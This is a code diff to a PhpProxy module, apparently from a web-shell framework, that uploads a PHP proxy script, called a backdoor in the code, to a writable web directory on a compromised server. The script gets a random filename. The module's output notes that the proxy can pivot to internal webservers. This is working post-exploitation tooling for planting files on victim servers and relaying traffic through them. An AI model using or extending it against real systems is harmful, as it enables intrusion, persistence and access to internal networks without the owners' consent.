@@ -9,16 +9,21 @@ from core.module import Module, ModuleException
 from core.vector import VectorList, Vector as V
 from core.parameters import ParametersList, Parameter as P
 from urlparse import urlparse
+from random import choice
+from string import letters
 import re
 
 
 classname = 'PhpProxy'
     
+    
+    
 class PhpProxy(Module):
 
     params = ParametersList('Install PHP proxy (needs remote php-curl)', [],
-                    P(arg='rdir', help='Remote writable web folder or \'find\' automatically', default='find', pos=0),
-                    P(arg='rname', help='Remote file name', default='weepro.php', pos=1))
+                    P(arg='rpath', help='Upload proxy script to web accessible path (ends with \'.php\')'),
+                    P(arg='finddir', help='Install proxy script automatically starting from web accessible dir', default='.'),
+                    )
     
 
     def __get_backdoor(self):
@@ -53,25 +58,39 @@ class PhpProxy(Module):
         
         return dir, url
         
+        
+    def run_module(self, rpath, finddir):
+
+        rname = ''.join(choice(letters) for i in xrange(4)) + '.php'
+
     
-    def run_module(self, rdir, rname):
+        if not rpath and finddir:
+            path, url = self.__find_writable_dir(finddir)
+            if not (path and url):
+                raise ModuleException(self.name, 'Writable dir in \'%s\' not found. Specify writable dir using \':net.php_proxy rpath=writable_dir/proxy.php\'' % finddir)
+            else:
+                path = path + rname
+                url = url + rname
+        else:
+            if not rpath.endswith('.php'):
+                raise ModuleException(self.name, 'Remote PHP path must ends with \'.php\'')
+            path = rpath
+            url = None
         
-        path, url = self.__find_writable_dir(rdir)
+    
+        if path:
 
-        if path and url:
-
-            path = path + rname
-            url = url + rname
-
-        
             phpfile = self.__get_backdoor()
             response = self.__upload_file_content(phpfile, path)
         
             if response:
-                self.mprint('[%s] PHP proxy uploaded as \'%s\'\n[%s] Calling %s?u=http://site.com\n[%s] can also pivot to internal webservers' % (self.name, path, self.name, url, self.name))
-        
-            return
-    
-
-        raise ModuleException(self.name,  "No writable web directory to upload PHP proxy")
+                
+                output_url = ''
+                if url:
+                    output_url = ' with address \'%s\'' % url
+                
+                self.mprint('[%s] PHP proxy uploaded%s, browse it with parameter \'?u=http://www.google.com\'' % (self.name, output_url))
+                return 
+            
+        raise ModuleException(self.name,  "Error installing remote PHP proxy, check uploading path")
         
